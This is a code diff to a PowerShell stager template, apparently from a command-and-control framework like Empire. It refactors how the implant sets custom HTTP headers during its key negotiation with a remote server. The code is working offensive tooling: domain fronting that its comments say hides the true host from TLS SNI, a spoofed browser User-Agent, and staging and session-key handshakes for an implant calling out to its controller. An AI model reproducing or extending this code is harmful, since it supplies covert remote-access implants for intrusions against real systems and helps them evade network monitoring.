@@ -907,6 +907,29 @@ function Convert-ToByteArrayDeep {
     return $out.ToArray()
 }
 
+{% macro apply_custom_headers(hop=False) -%}
+    if ($customHeaders -ne "") {
+        $headers = $customHeaders -split '<HEND>';
+        $headers | ForEach-Object {
+            $headerKey = $_.split(':')[0];
+            $headerValue = $_.split(':')[1];
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
+            $wc.Headers.Set($headerKey, $headerValue);
+        }
+    }
+    if ($UA) {
+        $wc.Headers.Set("User-Agent",$UA);
+    }
+{%- if hop %}
+    if ($hop) {
+        $wc.Headers.Set("Hop-Name",$hop);
+    }
+{%- endif %}
+{%- endmacro %}
+
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
 
@@ -968,19 +991,7 @@ function Start-Negotiate {
     if ($Script:Proxy) { $wc.Proxy = $Script:Proxy }
 
     # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
+    {{ apply_custom_headers() }}
 
     # session id (8 bytes ASCII)
     $ID='00000000'
@@ -1074,20 +1085,7 @@ function Start-Negotiate {
     $eb2 = Aes-EncryptThenHmac -Key $SessionKey -Plain $ib2
 
     # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
-    $wc.Headers.Add("Hop-Name",$hop);
+    {{ apply_custom_headers(hop=True) }}
 
     # stage_2: AES-256-GCM routing with AES/HMAC(SessionKey) body
     $routingPkt2 = Build-RoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
